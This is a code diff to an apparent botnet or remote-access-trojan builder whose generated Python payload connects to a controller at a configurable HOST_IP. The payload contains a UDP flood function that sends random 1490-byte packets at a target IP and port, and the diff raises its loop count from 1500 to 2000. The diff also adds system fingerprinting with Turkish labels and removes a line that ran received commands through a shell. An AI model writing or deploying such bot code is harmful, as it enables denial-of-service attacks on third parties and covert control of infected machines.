@@ -45,6 +45,7 @@ except:
 code = f'''
 import socket
 import subprocess
+import sys
 import time
 import random
 try:
@@ -54,6 +55,24 @@ except ImportError:
 import json
 import os
 web = False
+import platform as platform_2
+from sys import platform
+syst = "Bilinmeyen sistem?"
+
+def info():
+    global syst
+    system_enc = sys.getfilesystemencoding()
+    system_prc = platform_2.machine()
+    system_ver = platform_2.version()
+    py_ver = platform_2.python_version()
+    syst = "Windows"
+    if platform == "win32":
+        syst = "Windows x86-x64, İşlemci: "+system_prc+", Sistem sürümü: "+system_ver+", Sistem kodlama: "+system_enc+", Ana Python Dili Sürümü: "+py_ver
+    elif platform == "win64":
+        syst = "Windows x86, İşlemci: "+system_prc+", Sistem sürümü: "+system_ver+", Sistem kodlama: "+system_enc+", Ana Python Dili Sürümü: "+py_ver
+    else:
+        pass
+
 
 def stop_web():
     pass
@@ -63,7 +82,7 @@ def denial_service(ip, port):
         command_stop = cmd_recv()
         if command_stop == "stop":
             break
-        for i in range(1500):
+        for i in range(2000):
             bytes = random._urandom(1490)
             sock.sendto(bytes, (ip, int(port)))
 
@@ -97,7 +116,7 @@ def attack():
         elif command == "kill":
             break
         else:
-            execute = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            pass
 
 
 HOST_IP = '{ip}' 
